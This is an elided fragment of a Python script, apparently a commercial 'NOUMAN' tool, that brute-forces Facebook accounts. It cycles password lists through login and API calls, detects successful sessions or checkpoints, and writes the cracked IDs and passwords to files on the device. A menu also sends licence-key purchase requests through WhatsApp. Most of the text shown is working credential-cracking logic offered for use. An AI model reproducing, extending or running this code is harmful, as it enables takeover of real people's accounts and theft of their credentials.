...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi NOUMAN Sir, I Need To Buy Your Paid NOUMAN PRO Tools Version 1.1 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python NOUMAN.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        NOUMAN=session.cookies.get_dict().keys()
                        if "c_user" in NOUMAN:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [NOUMAN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/NOUMAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in NOUMAN:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [NOUMAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NOUMAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [NOUMAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NOUMAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/NOUMAN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [NOUMAN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/NOUMAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [NOUMAN-OK] '+uid+' | '+pas+'\033[1;97m')
